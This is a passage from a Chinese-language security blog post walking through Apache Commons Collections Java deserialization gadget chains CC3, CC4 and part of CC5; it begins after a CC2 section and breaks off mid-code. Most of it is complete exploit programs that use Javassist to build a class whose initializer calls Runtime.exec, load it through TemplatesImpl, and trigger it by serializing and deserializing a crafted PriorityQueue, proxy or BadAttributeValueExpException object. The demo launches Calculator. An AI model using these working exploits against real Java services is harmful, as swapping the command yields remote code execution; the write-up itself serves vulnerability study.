    }
到此CC2已经分析完成，这里顺便记录一下CC3的整体流程，因为CC3和CC2其原理基本类似，也就是将其利用的类换了一个，其实本质上还是调用了newInstance方法去进行实力化我们的恶意的class达到rce；
## CommonsCollections3
其变化的点是InvokerTransformer类换成了InstantiateTransformer类，这里追溯下InstantiateTransformer类下的transform方法；
    public T transform(Class input) {
        try {
            if (input == null) {
                throw new FunctorException("InstantiateTransformer: Input object was not an instanceof Class, it was a null object");
            } else {
                Constructor con = input.getConstructor(this.iParamTypes);
                return con.newInstance(this.iArgs);
            }
        } catch (NoSuchMethodException var3) {
            throw new FunctorException("InstantiateTransformer: The constructor must exist and be public ");
        } catch (InstantiationException var4) {
            throw new FunctorException("InstantiateTransformer: InstantiationException", var4);
        } catch (IllegalAccessException var5) {
            throw new FunctorException("InstantiateTransformer: Constructor must be public", var5);
        } catch (InvocationTargetException var6) {
            throw new FunctorException("InstantiateTransformer: Constructor threw an exception", var6);
        }
    }
不同版本的jdk其源码写法有差异，我的版本是java8u112；
简单的审计下不难发现是将input传入的Class对象进行了实力化操作；通过反射拿到input也即是传入的Class对象的构造器；获得传入形参的类型，然后newInstance进行调用；直接实力化对象；
### 直接放出exp，没啥好说的；
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.xalan.xsltc.runtime.AbstractTranslet;
    import org.apache.xalan.xsltc.trax.TemplatesImpl;
    import org.apache.commons.collections4.functors.InstantiateTransformer;
    import org.apache.xalan.xsltc.trax.TrAXFilter;
    import javax.xml.transform.Templates;
    import java.io.*;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    public class CC3 {
        public static class s1mple {
        }
        public static void main(String[] args) throws Exception {
            String AbstractTranslet = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
            String TemplatesImpl = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            ClassPool classpool = ClassPool.getDefault();
            classpool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            classpool.insertClassPath(new ClassClassPath(s1mple.class));
            classpool.insertClassPath(new ClassClassPath(s1mple.class));
            CtClass s2mple = classpool.get(s1mple.class.getName());
            CtClass s3mple = classpool.get(Class.forName(AbstractTranslet).getName());
            s2mple.setSuperclass(s3mple);
            s2mple.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\");");
            byte[] bt = s2mple.toBytecode();
            Class templatesimpl = Class.forName(TemplatesImpl);
            Constructor constructor= templatesimpl.getConstructor();
            Object temp = constructor.newInstance();
            //Object temp = new TemplatesImpl();
            Field name = templatesimpl.getDeclaredField("_name");
            name.setAccessible(true);
            name.set(temp,"s1mple_hack");
            Field bytecode = templatesimpl.getDeclaredField("_bytecodes");
            bytecode.setAccessible(true);
            bytecode.set(temp,new byte[][]{bt});
            //////////
            PriorityQueue priority = new PriorityQueue();
            //System.out.println(priority);
            priority.add(1);
            priority.add(1);
            InstantiateTransformer instan = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{temp});
            Transformer instans = (Transformer)instan;
            TransformingComparator trans = new TransformingComparator(instans);
            Class pri = priority.getClass();
            Field com = pri.getDeclaredField("comparator");
            com.setAccessible(true);
            com.set(priority,trans);
            Field que = pri.getDeclaredField("queue");
            que.setAccessible(true);
            Class TrA = TrAXFilter.class;
            Object[] innerArr = (Object[]) que.get(priority);
            innerArr[0] = TrA;
            innerArr[1] = TrA;
            ObjectOutputStream shuchu = new ObjectOutputStream(new FileOutputStream("a.bin"));
            shuchu.writeObject(priority);
          //test一下
            ObjectInputStream test = new ObjectInputStream(new FileInputStream("a.bin"));
            test.readObject();
        }
    }
唯一的遗憾是，中途碰到了个弱智的视力问题，因为没看清楚代码，导致了exp推迟两个小时出，中途还为学校的一些事伤脑没认真看，中途一直在debug，太糙了；；要不然可以根据之前的exp一分钟出，裂开；；
## CommonsCollections4
## exp+思考
这个链条也挺简单的，只是将我们前半部分的利用链换成了我们CC链1当中的利用链条；去调用任意类下的任意方法，这里直接去调用到我们最后Transformer类下的newTransformer方法去加载我们的恶意class；本质还是一样的，只不过是组合不一样而已；拿着之前写的exp稍微改改就成了新的exp；但是这个exp和之前的第一版本的exp一样，都是对jdk的版本有要求，在拿u66及以下版本的时候可以成功运行，
最开始跑的时候没结果，还以为写的有问题，后来想了下之前cc1的时候因为版本限制导致readObject下的memberValue被篡改而导致无法进行代理的完成。而cc4和cc1基本前部流程一样，那就直接换版本为u66（因为这个前期的链条在高版本中修复），进行运行弹出计算器；success；；
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.xalan.xsltc.runtime.AbstractTranslet;
    import java.io.*;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.util.HashMap;
    import java.util.Map;
    public class CC4 {
        public static class s1mple {
        }
        public static void main(String[] args) throws Exception {
            String AbstractTranslet = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
            String TemplatesImpl = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            ClassPool classpool = ClassPool.getDefault();
            classpool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            classpool.insertClassPath(new ClassClassPath(s1mple.class));
            classpool.insertClassPath(new ClassClassPath(s1mple.class));
            CtClass s2mple = classpool.get(s1mple.class.getName());
            CtClass s3mple = classpool.get(Class.forName(AbstractTranslet).getName());
            s2mple.setSuperclass(s3mple);
            s2mple.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\");");
            byte[] bt = s2mple.toBytecode();
            Class templatesimpl = Class.forName(TemplatesImpl);
            Constructor constructor= templatesimpl.getConstructor();
            Object temp = constructor.newInstance();
            Field name = templatesimpl.getDeclaredField("_name");
            name.setAccessible(true);
            name.set(temp,"s1mple_hack");
            Field bytecode = templatesimpl.getDeclaredField("_bytecodes");
            bytecode.setAccessible(true);
            bytecode.set(temp,new byte[][]{bt});
            String Annotation = "sun.reflect.annotation.AnnotationInvocationHandler";
            String lazy = "org.apache.commons.collections.map.LazyMap";
            String invoke = "org.apache.commons.collections.functors.InvokerTransformer";
            Transformer[] tran = new Transformer[]{new ConstantTransformer(temp),new InvokerTransformer("newTransformer",null,null)};
            Transformer chaintransform = new ChainedTransformer(tran);
            HashMap hashmap = new HashMap();
            Class Lazy = Class.forName(lazy);
            Constructor lazycon = Lazy.getDeclaredConstructor(Map.class, Transformer.class);
            lazycon.setAccessible(true);
            Object lay = lazycon.newInstance(hashmap,chaintransform);//调用chaintrsfrom下的for循环；
            Map lays = (Map)lay;
            Class Annotations = Class.forName(Annotation);
            Constructor constructor1 = Annotations.getDeclaredConstructors()[0];
            constructor1.setAccessible(true);
            Object s1mple = constructor1.newInstance(Override.class,lays);//调用get；
            InvocationHandler ssdd = (InvocationHandler)s1mple;//强行转化 ；
            Map proxy = (Map)Proxy.newProxyInstance(lay.getClass().getClassLoader(),lay.getClass().getInterfaces(),ssdd);
            InvocationHandler smple = (InvocationHandler)constructor1.newInstance(Override.class,proxy);//invoke
            ObjectOutputStream yy = new ObjectOutputStream(new FileOutputStream("aa.bin"));
            yy.writeObject(smple);
            ObjectInputStream what = new ObjectInputStream(new FileInputStream("aa.bin"));
            what.readObject();
        }
    }
## CommonsCollections5
这个链条虽说可以和前面的链条利用方式区别开，但是我感觉从本质上来说也只是换了种get的触发方法；网上的链条是利用新的触发get点和CC1的后半段进行连接，这里我简单的做了和CC2做个链接，自己简单的做了个挖掘；本身上还是换汤不换药；来看下；新引入的类为BadAttributeValueExpException和TiedMapEntry类；来看下内容；
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);
        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
来简单的看下，valObj是拿到val后赋值；然后判断其是否为空，如果为空则val赋值为null；否则将进行其他if判断，当SecurityManager未设置的时候会直接满足，调用valObj下的toString方法；这里引入TiedMapEntry类；
    public String toString() {
            return this.getKey() + "=" + this.getValue();
        }
    }
这里发现调用了getKey和getValue方法；追溯看看；
    public Object getKey() {
        return this.key;
    }
    public Object getValue() {
        return this.map.get(this.key);
    }
这里可以看到map.get，那就和LazyMap下的get方法很相似了；直接用这两个类代替之前的代理方法触发invoke然后触发get的点，达到最后加载恶意的class去进行rce；
## exp如下：
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.xalan.xsltc.runtime.AbstractTranslet;
    import javax.management.BadAttributeValueExpException;
    import java.io.*;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.Map;
    public class CC5 {
        public static class s1mple {
        }
        public static void main(String[] args) throws Exception{
            String lazymap = "org.apache.commons.collections.map.LazyMap";
            String AbstractTranslet = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
            String TemplatesImpl = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            ClassPool classpool = ClassPool.getDefault();
            classpool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            classpool.insertClassPath(new ClassClassPath(s1mple.class));
            classpool.insertClassPath(new ClassClassPath(s1mple.class));
            CtClass s2mple = classpool.get(s1mple.class.getName());
            CtClass s3mple = classpool.get(Class.forName(AbstractTranslet).getName());
            s2mple.setSuperclass(s3mple);
            s2mple.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\");");
            byte[] bt = s2mple.toBytecode();
            Class templatesimpl = Class.forName(TemplatesImpl);
            Constructor constructor= templatesimpl.getConstructor();